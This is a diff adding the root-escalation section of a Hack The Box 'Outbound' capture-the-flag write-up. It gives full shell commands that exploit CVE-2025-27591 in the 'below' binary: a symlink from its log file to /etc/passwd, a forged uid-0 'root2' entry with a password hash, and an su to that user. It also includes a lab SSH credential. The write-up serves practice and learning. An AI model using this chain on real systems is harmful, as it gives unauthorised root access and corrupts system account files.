@@ -104,3 +104,69 @@ after this we found ssh login ssh jacob@10.10.11.77 and his password to ssh  gY4
 
 and we successfully found user flag here :)
 
+Now its time to get root access so lets start -->
+I started checking which commands jacob can run with root permissions without needing a password:
+
+```bash
+sudo -l
+
+```
+then i got the result like this 
+```bash
+(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+
+```
+This means:
+
+Jacob can run /usr/bin/below as root without a password.
+
+But he can't use the --config, --debug, or -d arguments.
+
+This showed clearly that I had permission to run /usr/bin/below as root, without providing a password. However, certain parameters (--config, --debug, and -d) were blocked.
+
+To understand if this binary had known security issues, I checked its version and searched online using terms like:
+
+![below](/below.png)
+
+bingo :) we found the CVE exploit on it 
+The vulnerability (CVE-2025-27591) is related to improper handling of log files by the /usr/bin/below binary. When you run /usr/bin/below as root, it makes a log file (error_root.log) writable by anyone.
+I can abuse this by creating a symbolic link from the log file to the system's user-password file (/etc/passwd), allowing us to write directly into this critical file
+here are the steps you have to use to get root :
+Go to /var/log/below 
+create new user with this payload in jacob's access 
+```bash
+echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
+
+```
+next, Remove the original log file
+
+```bash
+rm error_root.log
+```
+Then create a symbolic link to the critical file (/etc/passwd)
+
+```bash
+ln -s /etc/passwd /var/log/below/error_root.log
+```
+Now, trigger the vulnerability by running
+
+```bash 
+sudo /usr/bin/below
+```
+This action sets the log file (error_root.log) permissions to writable, and since it's linked to /etc/passwd, this makes /etc/passwd writable.
+
+Then, overwrite /etc/passwd with your malicious user entry
+
+```bash
+cp root2 error_root.log
+```
+Finally, switch to your newly created root-level user
+
+```bash
+su root2
+```
+Got the root :) 
+![rootq](/root.png)
+
+[![Outbound Machine Achievement](/machine.png)](https://labs.hackthebox.com/achievement/machine/205810/672)
+ 
